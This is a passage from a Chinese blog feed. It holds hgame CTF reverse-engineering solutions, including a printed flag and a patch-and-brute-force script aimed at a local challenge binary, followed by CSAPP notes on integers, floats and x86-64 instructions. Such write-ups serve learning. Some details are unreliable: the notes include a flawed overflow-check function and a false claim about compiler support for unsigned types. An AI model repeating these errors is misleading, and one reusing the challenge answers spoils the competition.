class="hljs-number">0x6B</span>, <span class="hljs-number">0xC417</span>),<br>    (<span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6182</span>),<br>    (<span class="hljs-number">0x6D</span>, <span class="hljs-number">0x75DB</span>),<br>    (<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x3C61</span>),<br>    (<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x4996</span>),<br>    (<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5DC1</span>),<br>    (<span class="hljs-number">0x6F</span>, <span class="hljs-number">0x2D76</span>),<br>    (<span class="hljs-number">0x6F</span>, <span class="hljs-number">0x7D17</span>),<br>    (<span class="hljs-number">0x6F</span>, <span class="hljs-number">0xA91B</span>),<br>    (<span class="hljs-number">0x70</span>, <span class="hljs-number">0x9AED</span>),<br>    (<span class="hljs-number">0x72</span>, <span class="hljs-number">0x45D0</span>),<br>    (<span class="hljs-number">0x72</span>, <span class="hljs-number">0x8467</span>),<br>    (<span class="hljs-number">0x72</span>, <span class="hljs-number">0xAB5D</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0x5083</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0x6222</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0x8D93</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0x923A</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0x971E</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0xB4BA</span>),<br>    (<span class="hljs-number">0x73</span>, <span class="hljs-number">0xC785</span>),<br>    (<span class="hljs-number">0x74</span>, <span class="hljs-number">0x3558</span>),<br>    (<span class="hljs-number">0x74</span>, <span class="hljs-number">0x86BD</span>),<br>    (<span class="hljs-number">0x74</span>, <span class="hljs-number">0x9738</span>),<br>    (<span class="hljs-number">0x75</span>, <span class="hljs-number">0x3710</span>),<br>    (<span class="hljs-number">0x75</span>, <span class="hljs-number">0x9779</span>),<br>    (<span class="hljs-number">0x77</span>, <span class="hljs-number">0x2F3F</span>),<br>    (<span class="hljs-number">0x77</span>, <span class="hljs-number">0x44DD</span>),<br>    (<span class="hljs-number">0x7B</span>, <span class="hljs-number">0x78E1</span>),<br>    (<span class="hljs-number">0x7D</span>, <span class="hljs-number">0x9F42</span>)<br>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">takeSecond</span>(<span class="hljs-params">elem</span>):</span><br>    <span class="hljs-keyword">return</span> elem[<span class="hljs-number">1</span>]<br><br>a.sort(key=takeSecond)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-built_in">chr</span>(i[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32</span><br><br></code></pre></td></tr></table></figure><h3 id="hardasm">hardasm</h3><p>程序整体是<code>AVX2</code>指令集逆向但是根据校外的师傅 P1umH0 的<code>patch</code>方式来进行解题可能会更简单一些。</p><p>通过查看汇编可以了解到对应<code>Flag</code>长度为 32 位</p><p><img src="https://static01.imgkr.com/temp/80bba7a0d1864c45a4e7054195321e0f.png" alt=""></p><p>同时我们构造一个长度为 32 的伪<code>Flag</code>，对程序进行测试</p><blockquote><p>hgame{abcdefghijklmnopqrstuvwxy}</p></blockquote><p><img src="https://static01.imgkr.com/temp/85cc6282f86a491d948b4efff74305bc.png" alt=""></p><p>在程序中我们可以看到每一位都是有一个<code>cmp</code>函数进行对比正确与否，当遇到一个数据不对时就会往下跳转到<code>Error</code>处，在<code>Flag</code>中<code>hgame&#123;&#125;</code>总是正确的，同时我们在调试过程中也可以发现每当有一个输入的字符正确在栈空间内便会有一个<code>0xFF</code></p><p><img src="https://static01.imgkr.com/temp/3cece95bb0fc459d825737e3407a5335.png" alt=""></p><p>同时我们也观察到程序是将<code>Error</code>字符串通过<code>lea</code>给<code>rcx</code>，我们可以将其修改，改为输出对应判断后的栈内<code>[rsp+70h+var_50]</code>那么每有一个字符输入正确就会输出一个<code>0xFF</code>，我们可以通过其个数来判断输入的正确性。</p><p><img src="https://static01.imgkr.com/temp/4c3da8f286ea4dabaafbebf38dc57fb0.png" alt=""></p><p>我们将程序中的<code>Error</code>和<code>Success</code>部分修改成下图</p><p><img src="https://static01.imgkr.com/temp/2bd8cca0a80849b59fa2c907b11d295e.png" alt=""></p><p>那么我们便可以通过<code>Python</code>的<code>subprocess</code>库来实现爆破</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br>real_flag = <span class="hljs-string">&quot;hgame&#123;&quot;</span>  <span class="hljs-comment"># 绝对正确的前6个字符</span><br>cur_index = <span class="hljs-number">6</span>  <span class="hljs-comment"># 当前爆破的位置</span><br><span class="hljs-keyword">while</span> cur_index &lt; <span class="hljs-number">32</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):  <span class="hljs-comment"># 当前爆破的位置上的字符</span><br>        real_flag_arr = [<span class="hljs-number">0</span>] * <span class="hljs-number">32</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(real_flag)):  <span class="hljs-comment"># 正确的先复制一下</span><br>            real_flag_arr[j] = <span class="hljs-built_in">ord</span>(real_flag[j])<br>        real_flag_arr[<span class="hljs-built_in">len</span>(real_flag_arr) - <span class="hljs-number">1</span>] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)  <span class="hljs-comment"># 最后一个字符&quot;&#125;&quot;固定</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(real_flag_arr) - <span class="hljs-number">2</span>, cur_index, -<span class="hljs-number">1</span>):  <span class="hljs-comment"># 除了当前爆破的位置，其他位置上都设置为32</span><br>            real_flag_arr[j] = <span class="hljs-number">32</span><br>        real_flag_arr[cur_index] = i  <span class="hljs-comment"># 设置当前爆破的位置上的字符</span><br>        real_flag_arr_s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> real_flag_arr)  <span class="hljs-comment"># 输入到程序中的字符串</span><br>        p = subprocess.Popen([./hardasm.exe<span class="hljs-string">&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="hljs-string">        p.stdin.write(real_flag_arr_s.encode())</span><br><span class="hljs-string">        p.stdin.close()</span><br><span class="hljs-string">        out = p.stdout.read()</span><br><span class="hljs-string">        if len(out) &gt; cur_index:  # 判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置上的字符设置的是正确的</span><br><span class="hljs-string">            real_flag += chr(i)</span><br><span class="hljs-string">            cur_index += 1</span><br><span class="hljs-string">            print(real_flag)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="WOW">WOW</h3><p>这个题目其实算是一个自解密？</p><p><img src="https://static01.imgkr.com/temp/96aa1c61499e440abf264a46d1c23928.png" alt=""></p><p>进行动调我们可以看出来我们输入的<code>Flag</code>是在 3 个函数下进行加密，把加密后的数据存储于<code>Buf2</code>中间，在后面的<code>if</code>语句里存在一个<code>Buf1</code>而这个肯定是 <code>Flag</code>加密后得到的，里面的语句则是跳转到<code>B站</code>对应的视频，继续调试我们在下面的<code>input</code>中可以发现我们的输入，推断出程序可能是一个自解密？因而我们可以在动调时将程序内我们输入的字符串替换成相应的<code>Buf1</code>内的字符串，运行程序到<code>return 0</code>前，在 57 行的<code>input</code>处便可以看到<code>Flag</code>了。</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 学习笔记 [ 持续更新中 ]</title>
    <link href="/2022/03/14/CSAPP/"/>
    <url>/2022/03/14/CSAPP/</url>
    
    <content type="html"><![CDATA[<h1>CSAPP</h1><h2 id="逻辑运算">逻辑运算</h2><p><img src="https://s2.loli.net/2022/06/27/KzAgnaxlo1yqP9W.png" alt="1.png"></p><p>布尔运算支持<code>&amp;</code>对<code>|</code>的分配律：$a&amp;(b|c)=(a&amp;b)|(a&amp;c)$，同时也支持<code>|</code>对<code>&amp;</code>的分配律：$a|(b&amp;c)=(a|b)&amp;(a|c)$</p><p><img src="https://s2.loli.net/2022/06/27/ZKoBcG5guWREtVm.png" alt="2.png"></p><p>通过<code>xor</code>我们也可以实现两个数的交换，但是并没有性能上的提升</p><p><img src="https://s2.loli.net/2022/06/27/yHrIt3pafDWRcYT.png" alt="3.png"></p><p>相似的我们可以通过这个方式来实现数组的存储逆转，长度为偶数时函数会得到正确结果，以<code>1234</code>为例程序运行后的结果是<code>4321</code>，但是在长度为奇数个时，便会出现问题。以<code>12345</code>为例，输出的结果是<code>54021</code>。因为在中间到<code>first</code>和<code>last</code>相同时<code>xor</code>的是自己异或自己得到的便会是<code>0</code>，因此出现问题。对此我们只需要把<code>first&lt;=last</code>修改为<code>first&lt;last</code>即可。</p><p>我们可以利用位级和逻辑运算编写一个表达式，使其等价于<code>x==y</code>，即<code>x</code>和<code>y</code>相等时就返回<code>1</code>，否则就返回<code>0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ！(x^y) ;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/27/eSZgBaf8Qk34woH.png" alt=""></p><p>值得注意的是在移位时需要注意参数<code>x</code>的类型，在带符号位时需要对其用操作数的最高位<code>(符号位)</code>来进行补全。而不带符号的参数<code>x</code>则是补<code>0</code>即可。</p><img src="https://s2.loli.net/2022/02/27/ld3rOjY9DEv5WB8.png" style="zoom:80%;" /><p>对于补码转无符号数我们可以总结出来如下规律：</p><p><img src="https://s2.loli.net/2022/02/27/VWTvf8y21hHcKeG.png" alt=""></p><p>相反无符号数转补码为：</p><p><img src="https://s2.loli.net/2022/02/27/MUFrOSuT618LaD3.png" alt=""></p><blockquote><p>大致整理如下：</p><ol><li><p>无符号数转换为有符号数：看无符号数的最高位是否为1，如果不为1（即为0），则有符号数就直接等于无符号数；</p></li><li><p>如果无符号数的最高位为1，则将无符号数取补码，得到的数就是有符号数。</p></li><li><p>有符号数转换为无符号数 ：看有符号数的最高位是否为1，如果不为1（即为0），则无符号数就直接等于有符号数；</p></li><li><p>如果有符号数的最高位为1，则将有符号数取补码，得到的数就是无符号数。</p></li></ol></blockquote><p><strong>相关知识点：</strong></p><ol><li><p>在<code>C语言</code>中，一个有符号数与一个无符号数进行运算，那么<code>C语言</code>会将有符号数强制转换为无符号数来执行运算。</p></li><li><p>当一个有符号数从一个较小的数据类型转换成较大的数据类型时，进行符号位扩展，可以保持数值不变</p></li><li><p>当一个有符号数从一个较大的数据类型转换成较小的数据类型时，会丢弃对应高位的数据，保留低位的数据，而可能改变其值。</p><ul><li>无符号数截断相当于对对应<code>2的k次方</code>进行取模</li><li>有符号数截断相当于先将其无符号数对对应<code>2的k次方</code>进行取模，再将其得到的无符号数转为有符号数</li></ul></li><li><p><code>C语言</code>在执行加法时，不会对溢出发生报错，根据两个数的和必定大于两数之中任何一个，对此我们可以编写相关函数来检测是否发生了溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">over_flow</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br><span class="hljs-keyword">int</span> sum=a+b;<br><span class="hljs-keyword">if</span>(sum&gt;=a)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>对于有符号数加法数据溢出后的结果我们可以分为三类：</p><img src="https://s2.loli.net/2022/02/28/OiTwHsuYl4DXq9v.png" style="zoom: 50%;" /></li></ol><p>发生正数溢出时得到的结果时两个数的和减去对应二进制位长最大能表示的数据，而负数则是加上对应二进制位长最大能表示的数据。</p><ol start="6"><li><p>对于减法，我们引用一个概念<code>加法逆元</code> ，我们减去一个数可以理解为加上一个数的相反数，对此我们对无符号数进行求解其逆元可以分为如下两个情况：</p><img src="https://s2.loli.net/2022/02/28/6e2k4dfPMmUvN8J.png" style="zoom: 50%;" /></li></ol><p>而对于有符号数可以分成：</p><img src="https://s2.loli.net/2022/02/28/mYLJcQFUCdTaEOr.png" alt="10.png" style="zoom:50%;" /><ol start="7"><li>两个无符号数相乘可能需要<code>2w</code>位来存储数据，但是<code>C语言</code>中定义了无符号数的乘法所产生的结果是<code>w位</code>，因此，对于计算结果，会对其截断，保留<code>低w位</code>。即运算过程为：$( x * y )%2^w$</li></ol><p>而对于有符号数的相乘于无符号数是相似的，但是需要把结果转换为有符号数，即：$U_2T_w( ( x * y )%2^w )$</p><ol start="8"><li><p>对于除法3而言可能会出现小数的情况，对此我们总是将其向<code>0</code>进行取整，与逻辑右移<code>k</code>位是相同的，而对于有符号的数进行除法时，我们需要引入一个偏置来修正不合适的舍入。偏置的值为<code>1左移k位后减去1</code>，而偏置是怎么参与其中的？</p><p>对于<code>x 大于等于 0</code>的情况，我们可以直接进行算术右移，而当<code>x小于0</code>时，我们需要将<code>x 加上对应的偏置</code>后再进行右移。但可惜的是其不能推广到除以任意常数，仅限至于除以<code>2 的 k 次幂</code></p></li><li><p>浮点数的相关二进制位的权重如图：</p><img src="https://s2.loli.net/2022/02/28/sOjnrlWpBq6dube.png" style="zoom: 50%;" /></li></ol><p>但是这个方式无法表示较大的数据，在<code>IEEE</code>中我们引入一个新的方式来进行表示：</p><img src="https://s2.loli.net/2022/02/28/t4fYHoyVlLkAJO6.png" style="zoom:50%;" /><blockquote><p>s ：符号位    |    exp： 阶码    |    frac：小数字段</p></blockquote><p>其中数值大致可以分为三类：</p><img src="https://s2.loli.net/2022/02/28/plk7hLO1X5exV9f.png" style="zoom:50%;" /><ul><li><p>规格化的值</p><p>当阶码的二进制位不全为 0 ，且不全为 1 时，此时表示的是规格化的值。</p><img src="https://s2.loli.net/2022/02/28/tEnSAKZu4LGHNzk.png" style="zoom:50%;" /><p>对于图中<code>E</code>的值并不是解码所对应的值，而是需要其减去一个偏置，对于<code>float</code>和<code>double</code>的偏置是不相同的，则以<code>float</code>为例，其最小最大 E 值如下：$E_{min}=-126\ \ \ \  |  \ \ \ \  E_{max}=127$</p></li></ul><p>在小数字段上，尾数 M 被定义为 <code>1+f</code>，尾数的二进制表示如图：</p><p><img src="https://s2.loli.net/2022/02/28/lzF9vXcJm8hjQRY.png" alt=""></p><p>因为我们可以调整 E 的取指，使得尾数 M 的取值范围大于等于 1 ，小于 2 ，既然第一位总是一，那么就没有必要显示的表示出来，这也就是为什么尾数 M 的值需要加一。</p><ul><li><p>非规格化的值</p><p>当阶码的二进制位全为 0 时，此时表示的是非规格化的值。其大概有两个用途，其一是表示 0 ，其二是表示非常接近 0 的数。</p><img src="https://s2.loli.net/2022/02/28/gA1EdFz4KphNwbJ.png" style="zoom:67%;" /><p>若表示非常接近 0 的数，则阶码字段全为 0 ，阶码 E 的值等于<code>E = 1 - bias</code>, 尾数 M 的值是 f <code>( M = f )</code>。</p><blockquote><p>+0.0 和 -0.0 在某些方面认为时不同的，而在其他方面是相同的。</p></blockquote></li><li><p>特殊值</p><p>当阶码的二进制位全为 1 时，表示的数值是特殊值。特殊值分为两类，一类表示无穷大或者无穷小，另外一类表示不是一个数。</p><img src="https://s2.loli.net/2022/02/28/hl7m28MvbydHGow.png" style="zoom: 50%;" /></li></ul><p>​如我们输出下列数据，得到的返回值便是 NaN<code>(不是一个数)</code>，如：$\sqrt{-1}\ \ \ \ | \ \ \ \ \infty-\infty$</p><ol start="10"><li>向偶数舍入，取决于那边是偶数位，如 1.5 处于 1 和 2 中间，那么向偶数舍入便是向 2 进行舍入，得到结果 2，再以 2.5 为例子，其处于 2 和 3 中间，向偶数舍入便是 2 。</li><li>浮点数的计算不符合<strong>结合律</strong>和<strong>分配律</strong></li><li>乘法指令运行时需要多个时钟周期，因此运行会十分缓慢，多数情况下技术按及会使用移位加减法来实现对应的乘法运算。也正如第 7 点所提到的，计算机会在溢出时采取截尾的方式来存储数据。</li><li>源码取反加一为补码</li></ol><p>对此我们总结一般不要使用无符号数，并且大多编译器都不支持无符号数，它带来的问题总是比其所具有的优势多，也需要十分小心的使用浮点数运算，因为其只有有限的范围和精度，且补遵守普遍的算术属性，如结合性。</p><h2 id="程序的机器级表示">程序的机器级表示</h2><h3 id="MOV-指令">MOV 指令</h3><p><code>ATT</code>格式的汇编代码中，立即数的书写方式是<code>$</code>后面更衣柜用标准 C 表示的整数，如<code>$-577</code>或者<code>$0x1F</code>。用$r_a$表示任意寄存器<code>a</code>，引用$R[r_a]$来表示其值，用$M_b[Addr]$表示对存储在内存中从地址<code>Adrr</code>开始的 b 字节的引用。</p><p><img src="https://s2.loli.net/2022/03/02/D7yKgTPct3R5dkJ.png" alt=""></p><p>操作数格式：<br>操作数可以表示立即数 ( 常数 ) 值 、寄存器值或者是来自内存的值 ，比例因子 s 必须是 1、2、4 或者 8</p><p><code>MOV</code>指令在后面加上对应的字母表示传送不同字节大小的数据，其中<code>b -&gt; 1字节 w -&gt; 2字节 l -&gt; 4字节 q -&gt; 8字节</code></p><p>源操作数指定的值是一个立即数，春促与寄存器或者内存之中。目的操作数指定一个位置，要么是是一个寄存器或者，要么是一个内存地址。<code>MOV</code>指令的两个操作数不能都指向内存地址，将一个值从内存位置复制到另一个内存位置需要两条指令，第一条将源值加载到寄存器中，第二条指令将该寄存器写入目的位置。</p><p><img src="https://s2.loli.net/2022/03/02/DEbO3oLxkXrUKfJ.png" alt=""></p><p>在两类数据移动指令中<code>MOVZ</code>类中的指令会把目的中剩余的字节填充为<code>0</code>，而<code>MOVS</code>类中的指令会进行符号位的扩展，即用符号位来填充剩余的字节。</p><p><img src="https://s2.loli.net/2022/03/02/IKgOzWpq6PSxYc8.png" alt=""></p><p><img src="https://s2.loli.net/2022/03/02/1HNeCzIV9mwuE4J.png" alt=""></p><p><code>3-5</code>中并没有明确指令把 4 字节源值扩展到 8 字节的目的，按逻辑上应该被称为<code>movzlq</code>但是并不存在这样的指令，不过可以通过以寄存器为目的的<code>movl</code>指令来实现。原理是，生成 4 字节值并以寄存器为目的的指令会把高 4 字节设置为 0 。</p><p>我们举一个传送数据的例子来了解一下<code>MOV</code>是如何传递值来改变寄存器的</p><p><img src="https://s2.loli.net/2022/03/02/i7woq4LPV1tC9yf.png" alt=""></p><p>可以看到左边是源数据，右边是目的数，将左边的数据传递到右边，在这个过程中，我们需要注意到<code>-1</code>的 16 进制位是<code>FF···F</code>，而对于寄存器<code>rax</code>的结构如下图：</p><p><img src="https://s2.loli.net/2022/03/02/qzL9gxsMjlJaFi3.png" alt=""></p><p>可以看到低 8 位是<code>al</code>，在第二行的代码中<code>movb</code>将``-1<code>的值传递给了其低 8 位 ( 低两位字节 ) ，而其余字节保持不变，</code>movw<code>把低 16 位( 低位四字节 ) 设置为了</code>FFFF<code> ，而其余字节保持不变，</code>movl<code>将低 32 位( 低位八字节 )设置为</code>FFFFFFFF<code>同时把高位四字节设置为</code>00000000<code>，而最后的</code>movq<code>把整个寄存器值设置为了</code>FFFFFFFFFFFFFFFF`</p><blockquote><p>习题 3.3</p><p>相关指令的错误使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">movb $0xF,(%ebx) 错误：不能使用%ebx作为地址寄存器<br>movl %rax,(%rsp) 错误：指令后缀和寄存器id不匹配<br>movw (%rax),4(%rsp) 错误：不能直接从内存移动到内存<br>movb %al,%sl 错误：没有叫做%sl的寄存器<br>movq %rax,$0x123 错误：目的操作数不能是立即数<br>movl %eax,%rdx 错误：目的操作数大小不正确<br>movb %si,8(%rbp) 错误：指令后缀和寄存器id不匹配（%si是16bit寄存器）<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://s2.loli.net/2022/03/03/vqW5YzsZ34if2cN.png" alt=""></p><p>在栈这个数据结构中我们可以使用<code>push</code>将数据压入栈，通过<code>pop</code>把数据删除，其具有一个属性：弹出的值永远是最近被压入而且仍在栈中的值。栈指针 ( <code>%rsp</code> ) ，压栈是减小栈指针的值，并将数据存放到内存中，而出栈是从内存中读取数据，并增加栈指针的值。</p><blockquote><p>(1）ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p><p>（2）EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p></blockquote><h3 id="ADD-指令">ADD 指令</h3><p><code>ADD</code>指令由四条加法组成：<code>addb、addw、addl、addq</code>分别表示字节加法、字加法、双字加法、和四字加法。通常来说，每个指令都会存在上述对应的<code>b、w、l、q</code>，对应着处理字节、字、双字、四字。</p><img src="https://s2.loli.net/2022/03/03/bK1MvhAsNDuiwPc.png" style="zoom: 67%;" /><p>上图中大多数指令，既可以用于无符号运算，也可以用于补码运算，同时只有右移操作要求区分有符号数和无符号数，这个特性使得不嘛孕栓成为实现有符号整数运算的一种比较好实现的方法原因之一。</p><p><code>leaq</code>指令是用于加载有效地址，通常用来执行简单的算术操作。本质上算是<code>movq</code>指令的一种变形。其指令形式是从内存读取数据到寄存器，但是它更本上就没有引用内存，其操作数看上去是一个内存引用，但其实际上是将有效地址写入到目的操作数。举个例子设%<code>rdx</code>的值是<code>x</code>那么我们执行<code>leaq 7(%rdx,%rdx,x) , %rax</code>指令则是相当于把<code>%rax</code>的值设置为了<code>5x+7</code>。需要注意的是目的操作数必须是一个寄存器。</p><p>在利用寄存器进行移位操作时，先给出移位量，然后第二位给出要移位的数，可以执行算术 ( 要补符号位 ) 或者逻辑右移( 高位补 0 ) ，位移量可以是一个立即数，或者存放在单字节寄存器<code>%cl</code>里 ( 仅允许把这个寄存器作为操作数 ) 。因为寄存器<code>%cl</code>是单字节的所以在其值为<code>0xFF</code>时拥有最大的位移量，即<code>256-1</code>，此时对应的指令<code>salb</code>会移 7 位，<code>salw</code>会移 15 位，<code>sall</code>会移 31 位，<code>salq</code>会移 63 位。</p><p>左移拥有两个名字<code>sal</code>和<code>shl</code>，两种指令效果是一样的，但是在右移指令的两种形式中却不相同<code>sar</code>是算术右移，会填上符号位，而<code>shr</code>是逻辑右移，是填充 0 。</p><blockquote><p>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">shift_left4_rightn</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> n)</span></span>&#123;<br>x&lt;&lt;=<span class="hljs-number">4</span>;<br>x&gt;&gt;=n;<br><span class="hljs-keyword">return</span> x;<br>&#125;<br><span class="hljs-comment">//现有 x in %rdi , n in %rsi , 使用算术右移</span><br><span class="hljs-comment">//则对应汇编代码为:</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">shift_left4_rightn:</span><br><span class="hljs-comment">movq %rdi, %rax</span><br><span class="hljs-comment">shlq $4, %rax</span><br><span class="hljs-comment">movl %esi, %ecx</span><br><span class="hljs-comment">sarl %cl, %rax</span><br><span class="hljs-comment">ret</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></blockquote><p>对于两个 64 位无符号或者有符号的整数相乘是需要 128 位来表示，但是<code>x86-64</code>指令集对<code>128</code>位（ 16字节 ）数的操作提供有限的支持，对此<code>Intel</code>把 16 字节的数称为八字，下图位支持两个 64 位数字的全 128 位乘积以及除法的指令。</p><p><img src="https://s2.loli.net/2022/03/06/rfEtwCk7SH82pRo.png" alt=""></p><p>上述指令中<code>mulq</code>和<code>imulq</code>都要求一个参数必须在<code>%rax</code>中，而晾衣杆作为指令的源操作数给出，然后将成绩存放在寄存器<code>%rdx (高64位)</code>和<code>%rax (低64位)</code>中，虽然<code>imulq</code>可以用于两个不同的乘法操作，但是汇编器能够通过计算操作数的数目分辨出想用哪条指令。</p><p>而对于除法或者取模操作，这些操作是由单操作数除法指令来提供的，类似于单操作数乘法指令。有符号除法指令<code>idaivl</code>将寄存器<code>%rdx (高64位)</code>和<code>%rax (低64位)</code>中的 128 位数作为被除数，而除数作为至零点操作数给出。指令将商存储在寄存器<code>%rax</code>中，将余数存储在寄存器<code>%rdx</code>中。</p><p>对于大多数 64 位除法来说，除数也常常是一个 64 位的值。这个值应该存放在<code>%rax</code>中，<code>%rdx</code>的位应该设置位全 0 （无符号运算）或者<code>%rax</code>的符号位（有符号运算）。后面这个操作可以用<code>cqto [Intel 文档中叫做 cqo]</code> 来完成。这条指令不需要操作数，它能隐含读出<code>%rax</code>的符号位，将其复制到<code>%rdx</code>的所有位。</p><blockquote><p>下面举出乘法的相关实现的例子：</p> <img src="https://s2.loli.net/2022/03/06/k6zIKJi5XFQn8C1.png" alt="27.png" style="zoom: 80%;" /><p>可以看到存储乘积需要两个<code>movq</code>指令：一个存储低 8 字节（第 4 行），一个村粗高 8 个字节（第 5 行）。</p><p>下面举出除法的相关实现的例子：</p><p><img src="https://s2.loli.net/2022/03/06/mX1ULjlBSwDOkz8.png" alt=""><br><img src="https://s2.loli.net/2022/03/06/ef8haPNlus2nLUb.png" alt=""></p></blockquote><h3 id="条件码">条件码</h3><p><code>CF</code>：进位标志。最近的操作使最高位产生了进位。可以用来检查无符号操作的溢出。</p><blockquote><p>CF进位标志的作用：<br>1.当两个数相加时，若最高位向上形成进位，则CF=1；<br>2.当两个数相减时，若最高位向上形成借位，则CF=1；<br>3.当两个无符号数相乘时，若乘积的高一半为0，则CF=0；<br>4.当两个带符号数相乘时，若乘积的高一半是低一半的符号扩展，则CF=0.</p></blockquote><p><code>ZF</code>：零标志。最近的操作得出的结果为 0 。</p><p><code>SF</code>：符号标志。最近的操作得到的结果为负数。设置为 1 表示最近运算小于 0 为真，设置为 0 表示最近运算小于 0 为假。</p><p><code>OF</code>：溢出标志。最近的操作导致一个补码溢出——正溢出或者负溢出。设置为 0 表示无溢出。</p><p>指令<code>TEST S1, S2</code>基于<code>S1 &amp; S2</code>，如用<code>testq %rax, %rax</code>来检查<code>%rax</code>是负数还是正数还是零，或其中一个操作数是一个掩码，用来指示哪些位为应该被测试。</p><p>对于逻辑操作，进位标志和溢出标志会被设置成 0 。对于移位操作，进位标志将设置为最后一个被移出的位，而一处标志设置为 0 。<code>INC (加一)</code>和<code>DEC (减一)</code>会设置溢出和零标志，但是不会改变进位标志。同时特殊的<code>CMP 、SUB、AND、TEST</code>指令根据两个操作数的差来设置条件码而不改变其他寄存器。</p><p><img src="https://s2.loli.net/2022/03/08/rY3GajinI8bksZu.png" alt=""></p><blockquote><p>值得注意的是<code>setl</code>与<code>setb</code>指令表示小于时设置和低于时设置，而并非设置长字和设置字节。</p><ol><li><p>分析<code>setl</code>。当<code>SF^OF</code>为1时（此条指令代表的是<code>a&lt;b</code>，即为1时有<code>a&lt;b</code>），会将D设置为1，否则设置为0。有两种情况<code>SF^OF</code>为1：<br>a. <code>SF = 1 OF = 0</code>，此时<code>OF = 0</code>即没有发生溢出，那么结果t就是正常结果。<code>SF = 1</code>即结果t是负数，即a-b&lt;0即a&lt;b。符合情况。<br>b. <code>SF = 0 OF = 1</code>，此时OF = 1即发生了溢出，且<code>SF = 0</code>说明结果t为非负数，所以很明显这里是发生的负溢出，所以溢出结果为非负数。a-b&gt;=0这里负溢出，所以两个部分都为负，a为负，-b为负，所以b为正，既然a为负，b为正，那儿必有a&lt;b。符合情况。</p></li><li><p>分析<code>setle</code>。既然<code>SF^OF = 1</code>代表小于且<code>ZF = 1</code>代表等于，那么<code>(SF^OF) | ZF = 